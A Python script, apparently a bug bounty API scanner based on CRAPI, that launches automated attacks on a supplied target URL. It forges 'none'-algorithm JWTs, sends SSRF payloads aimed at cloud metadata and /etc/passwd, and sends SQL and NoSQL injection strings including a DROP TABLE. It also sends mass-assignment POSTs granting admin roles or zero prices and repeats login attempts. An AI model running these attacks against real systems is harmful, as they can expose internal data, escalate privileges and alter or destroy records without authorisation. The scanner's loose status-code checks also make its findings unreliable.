#!/usr/bin/env python3
"""
API Vulnerability Detection Script
Based on CRAPI vulnerability patterns for bug bounty hunting
"""

import requests
import json
import sys
import time
import jwt
import base64
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import warnings
warnings.filterwarnings('ignore')

class APIVulnScanner:
    def __init__(self, target_url, token=None):
        self.target = target_url.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (APIScanner/1.0)',
            'Accept': 'application/json'
        })
        if token:
            self.session.headers['Authorization'] = f'Bearer {token}'
        
        self.findings = []
        self.endpoints = set()
        
    def log_finding(self, severity, vuln_type, description, evidence=""):
        """Log a vulnerability finding"""
        finding = {
            'severity': severity,
            'type': vuln_type,
            'description': description,
            'evidence': evidence,
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S')
        }
        self.findings.append(finding)
        print(f"[{severity}] {vuln_type}: {description}")
        
    def discover_endpoints(self):
        """Discover API endpoints through various methods"""
        print("[*] Discovering API endpoints...")
        
        # Common API paths
        common_paths = [
            '/api', '/api/v1', '/api/v2', '/api/v3',
            '/v1', '/v2', '/v3', '/graphql',
            '/api/users', '/api/auth', '/api/login',
            '/api/products', '/api/orders', '/api/payments',
            '/api/admin', '/api/dashboard', '/api/config',
            '/api/search', '/api/upload', '/api/download',
            '/api/webhook', '/api/callback', '/api/oauth',
            '/rest', '/rest/v1', '/rest/v2',
            '/swagger', '/api-docs', '/openapi.json'
        ]
        
        for path in common_paths:
            try:
                url = f"{self.target}{path}"
                resp = self.session.get(url, timeout=5)
                if resp.status_code not in [404, 503]:
                    self.endpoints.add(path)
                    print(f"  [+] Found: {path} (Status: {resp.status_code})")
            except:
                pass
                
        return list(self.endpoints)
    
    def test_bola(self, endpoint, id_param="id"):
        """Test for BOLA/IDOR vulnerabilities"""
        print(f"[*] Testing BOLA on {endpoint}")
        
        # Try sequential IDs
        base_url = f"{self.target}{endpoint}"
        accessible_ids = []
        
        for test_id in [1, 2, 100, 1000, 9999]:
            try:
                url = f"{base_url}/{test_id}"
                resp = self.session.get(url, timeout=5)
                if resp.status_code == 200:
                    accessible_ids.append(test_id)
            except:
                pass
        
        if len(accessible_ids) > 1:
            self.log_finding(
                "HIGH", 
                "BOLA/IDOR",
                f"Potential BOLA vulnerability in {endpoint}",
                f"Accessible IDs: {accessible_ids}"
            )
            
        # Try UUID enumeration
        test_uuids = [
            "00000000-0000-0000-0000-000000000001",
            "11111111-1111-1111-1111-111111111111",
            "test", "admin", "../1", "1 OR 1=1"
        ]
        
        for uuid in test_uuids:
            try:
                url = f"{base_url}/{uuid}"
                resp = self.session.get(url, timeout=5)
                if resp.status_code in [200, 403]:
                    self.log_finding(
                        "MEDIUM",
                        "BOLA/IDOR",
                        f"Endpoint {endpoint} responds to UUID: {uuid}",
                        f"Status: {resp.status_code}"
                    )
            except:
                pass
    
    def test_broken_auth(self):
        """Test for broken authentication"""
        print("[*] Testing authentication mechanisms")
        
        auth_endpoints = [
            '/api/auth/login', '/api/login', '/login',
            '/api/auth/register', '/api/register', '/register',
            '/api/auth/reset', '/api/reset-password', '/forgot-password',
            '/api/auth/verify', '/api/verify', '/verify-otp'
        ]
        
        for endpoint in auth_endpoints:
            try:
                url = f"{self.target}{endpoint}"
                
                # Test for rate limiting
                start_time = time.time()
                for i in range(10):
                    resp = self.session.post(url, json={
                        'username': 'test',
                        'password': 'test'
                    }, timeout=2)
                
                elapsed = time.time() - start_time
                if elapsed < 5:  # 10 requests in less than 5 seconds
                    self.log_finding(
                        "HIGH",
                        "No Rate Limiting",
                        f"No rate limiting on {endpoint}",
                        f"10 requests in {elapsed:.2f} seconds"
                    )
                    
                # Test weak password reset
                resp = self.session.post(f"{self.target}/api/auth/reset", json={
                    'email': 'test@test.com'
                }, timeout=5)
                
                if resp.status_code == 200:
                    try:
                        data = resp.json()
                        if any(k in str(data).lower() for k in ['token', 'otp', 'code', 'pin']):
                            self.log_finding(
                                "CRITICAL",
                                "Sensitive Data in Response",
                                f"Password reset token/OTP in response",
                                str(data)[:200]
                            )
                    except:
                        pass
                        
            except:
                pass
    
    def test_excessive_data_exposure(self, endpoint):
        """Test for excessive data exposure"""
        print(f"[*] Testing data exposure on {endpoint}")
        
        try:
            url = f"{self.target}{endpoint}"
            resp = self.session.get(url, timeout=5)
            
            if resp.status_code == 200:
                try:
                    data = resp.json()
                    sensitive_fields = [
                        'password', 'secret', 'token', 'api_key', 'apikey',
                        'private_key', 'ssn', 'credit_card', 'cvv',
                        'pin', 'otp', 'session', 'cookie', 'authorization',
                        '__internal', '_id', 'is_admin', 'role', 'permissions'
                    ]
                    
                    found_sensitive = []
                    
                    def check_dict(d, path=""):
                        if isinstance(d, dict):
                            for key, value in d.items():
                                field_path = f"{path}.{key}" if path else key
                                if any(s in key.lower() for s in sensitive_fields):
                                    found_sensitive.append(field_path)
                                if isinstance(value, (dict, list)):
                                    check_dict(value, field_path)
                        elif isinstance(d, list):
                            for item in d:
                                check_dict(item, path)
                    
                    check_dict(data)
                    
                    if found_sensitive:
                        self.log_finding(
                            "HIGH",
                            "Excessive Data Exposure",
                            f"Sensitive fields exposed in {endpoint}",
                            f"Fields: {', '.join(found_sensitive[:5])}"
                        )
                        
                except:
                    pass
        except:
            pass
    
    def test_mass_assignment(self, endpoint):
        """Test for mass assignment vulnerabilities"""
        print(f"[*] Testing mass assignment on {endpoint}")
        
        # Common parameters that shouldn't be user-controllable
        dangerous_params = {
            'role': 'admin',
            'is_admin': True,
            'is_staff': True,
            'is_superuser': True,
            'verified': True,
            'balance': 999999,
            'credit': 999999,
            'discount': 100,
            'price': 0,
            'status': 'approved',
            'permissions': ['*'],
            '__proto__': {'isAdmin': True}
        }
        
        for param, value in dangerous_params.items():
            try:
                url = f"{self.target}{endpoint}"
                payload = {param: value, 'test': 'test'}
                
                resp = self.session.post(url, json=payload, timeout=5)
                
                if resp.status_code in [200, 201]:
                    self.log_finding(
                        "HIGH",
                        "Potential Mass Assignment",
                        f"Endpoint {endpoint} accepts parameter: {param}",
                        f"Payload: {payload}"
                    )
            except:
                pass
    
    def test_jwt_vulnerabilities(self):
        """Test for JWT vulnerabilities"""
        print("[*] Testing JWT vulnerabilities")
        
        auth_header = self.session.headers.get('Authorization', '')
        if not auth_header.startswith('Bearer '):
            return
            
        token = auth_header.replace('Bearer ', '')
        
        try:
            # Decode without verification
            decoded = jwt.decode(token, options={"verify_signature": False})
            self.log_finding(
                "INFO",
                "JWT Decoded",
                "JWT payload decoded",
                str(decoded)
            )
            
            # Test none algorithm
            header = jwt.get_unverified_header(token)
            header['alg'] = 'none'
            
            # Create token with none algorithm
            parts = token.split('.')
            new_header = base64.urlsafe_b64encode(
                json.dumps(header).encode()
            ).decode().rstrip('=')
            
            none_token = f"{new_header}.{parts[1]}."
            
            # Test the none algorithm token
            test_session = requests.Session()
            test_session.headers['Authorization'] = f'Bearer {none_token}'
            
            for endpoint in self.endpoints:
                try:
                    url = f"{self.target}{endpoint}"
                    resp = test_session.get(url, timeout=5)
                    if resp.status_code == 200:
                        self.log_finding(
                            "CRITICAL",
                            "JWT None Algorithm",
                            f"JWT none algorithm accepted on {endpoint}",
                            "Algorithm confusion vulnerability"
                        )
                        break
                except:
                    pass
                    
        except Exception as e:
            pass
    
    def test_ssrf(self):
        """Test for SSRF vulnerabilities"""
        print("[*] Testing SSRF vulnerabilities")
        
        ssrf_payloads = [
            'http://169.254.169.254/latest/meta-data/',
            'http://localhost:8080',
            'http://127.0.0.1:22',
            'file:///etc/passwd',
            'gopher://localhost:8080',
            'dict://localhost:11211',
            'http://webhook.site/unique-id'  # Use your own webhook
        ]
        
        # Parameters that might be vulnerable to SSRF
        params_to_test = [
            'url', 'callback', 'webhook', 'redirect', 'return',
            'next', 'ref', 'source', 'uri', 'path', 'dest',
            'destination', 'file', 'img', 'image', 'link',
            'callback_url', 'webhook_url', 'redirect_uri'
        ]
        
        for endpoint in self.endpoints:
            for param in params_to_test:
                for payload in ssrf_payloads[:3]:  # Test first 3 to avoid noise
                    try:
                        url = f"{self.target}{endpoint}"
                        
                        # Test GET
                        resp = self.session.get(
                            url, 
                            params={param: payload},
                            timeout=5
                        )
                        
                        if resp.status_code in [200, 302] and len(resp.content) > 0:
                            self.log_finding(
                                "HIGH",
                                "Potential SSRF",
                                f"SSRF parameter {param} on {endpoint}",
                                f"Payload: {payload}"
                            )
                            
                        # Test POST
                        resp = self.session.post(
                            url,
                            json={param: payload},
                            timeout=5
                        )
                        
                        if resp.status_code in [200, 201]:
                            self.log_finding(
                                "HIGH",
                                "Potential SSRF",
                                f"SSRF in POST {param} on {endpoint}",
                                f"Payload: {payload}"
                            )
                            
                    except:
                        pass
    
    def test_injection(self, endpoint):
        """Test for SQL/NoSQL injection"""
        print(f"[*] Testing injection on {endpoint}")
        
        # SQL injection payloads
        sql_payloads = [
            "' OR '1'='1",
            "1 OR 1=1",
            "' OR '1'='1' --",
            "admin'--",
            "1; DROP TABLE users--",
            "' UNION SELECT NULL--"
        ]
        
        # NoSQL injection payloads
        nosql_payloads = [
            '{"$ne": ""}',
            '{"$gt": ""}',
            '{"$regex": ".*"}',
            '{"$where": "1==1"}',
            '{"username": {"$ne": null}}'
        ]
        
        # Test SQL injection
        for payload in sql_payloads:
            try:
                url = f"{self.target}{endpoint}"
                
                # GET parameter injection
                resp = self.session.get(
                    url,
                    params={'id': payload, 'search': payload},
                    timeout=5
                )
                
                if 'error' in resp.text.lower() and any(db in resp.text.lower() for db in ['mysql', 'postgresql', 'sqlite', 'oracle']):
                    self.log_finding(
                        "CRITICAL",
                        "SQL Injection",
                        f"SQL error disclosure on {endpoint}",
                        resp.text[:200]
                    )
                    
            except:
                pass
        
        # Test NoSQL injection
        for payload in nosql_payloads:
            try:
                url = f"{self.target}{endpoint}"
                resp = self.session.post(
                    url,
                    data=payload,
                    headers={'Content-Type': 'application/json'},
                    timeout=5
                )
                
                if resp.status_code == 200:
                    self.log_finding(
                        "HIGH",
                        "Potential NoSQL Injection",
                        f"NoSQL payload accepted on {endpoint}",
                        f"Payload: {payload}"
                    )
                    
            except:
                pass
    
    def run_all_tests(self):
        """Execute all vulnerability tests"""
        print("\n" + "="*60)
        print("API VULNERABILITY SCANNER - Based on CRAPI")
        print("="*60)
        print(f"Target: {self.target}\n")
        
        # Discover endpoints
        self.discover_endpoints()
        
        if not self.endpoints:
            print("[!] No endpoints discovered. Adding common ones...")
            self.endpoints = ['/api/users', '/api/auth/login', '/api/products']
        
        print(f"\n[*] Testing {len(self.endpoints)} endpoints...\n")
        
        # Run tests
        self.test_broken_auth()
        self.test_jwt_vulnerabilities()
        self.test_ssrf()
        
        # Test each endpoint
        for endpoint in self.endpoints:
            self.test_bola(endpoint)
            self.test_excessive_data_exposure(endpoint)
            self.test_mass_assignment(endpoint)
            self.test_injection(endpoint)
        
        # Generate report
        self.generate_report()
        
    def generate_report(self):
        """Generate vulnerability report"""
        print("\n" + "="*60)
        print("VULNERABILITY REPORT")
        print("="*60)
        
        if not self.findings:
            print("[*] No vulnerabilities found")
            return
            
        # Group by severity
        critical = [f for f in self.findings if f['severity'] == 'CRITICAL']
        high = [f for f in self.findings if f['severity'] == 'HIGH']
        medium = [f for f in self.findings if f['severity'] == 'MEDIUM']
        low = [f for f in self.findings if f['severity'] == 'LOW']
        info = [f for f in self.findings if f['severity'] == 'INFO']
        
        print(f"\nSummary:")
        print(f"  CRITICAL: {len(critical)}")
        print(f"  HIGH: {len(high)}")
        print(f"  MEDIUM: {len(medium)}")
        print(f"  LOW: {len(low)}")
        print(f"  INFO: {len(info)}")
        
        # Save to file
        report_file = f"api_scan_{urlparse(self.target).netloc}_{time.strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w') as f:
            json.dump({
                'target': self.target,
                'scan_time': time.strftime('%Y-%m-%d %H:%M:%S'),
                'endpoints_discovered': list(self.endpoints),
                'findings': self.findings
            }, f, indent=2)
            
        print(f"\n[*] Report saved to: {report_file}")
        
        # Print critical findings
        if critical:
            print("\n[!] CRITICAL FINDINGS:")
            for finding in critical:
                print(f"  - {finding['type']}: {finding['description']}")


def main():
    if len(sys.argv) < 2:
        print("Usage: python3 detect_api_vulns.py <target_url> [auth_token]")
        print("Example: python3 detect_api_vulns.py https://api.target.com")
        print("Example: python3 detect_api_vulns.py https://api.target.com eyJhbGc...")
        sys.exit(1)
    
    target = sys.argv[1]
    token = sys.argv[2] if len(sys.argv) > 2 else None
    
    scanner = APIVulnScanner(target, token)
    scanner.run_all_tests()


if __name__ == "__main__":
    main()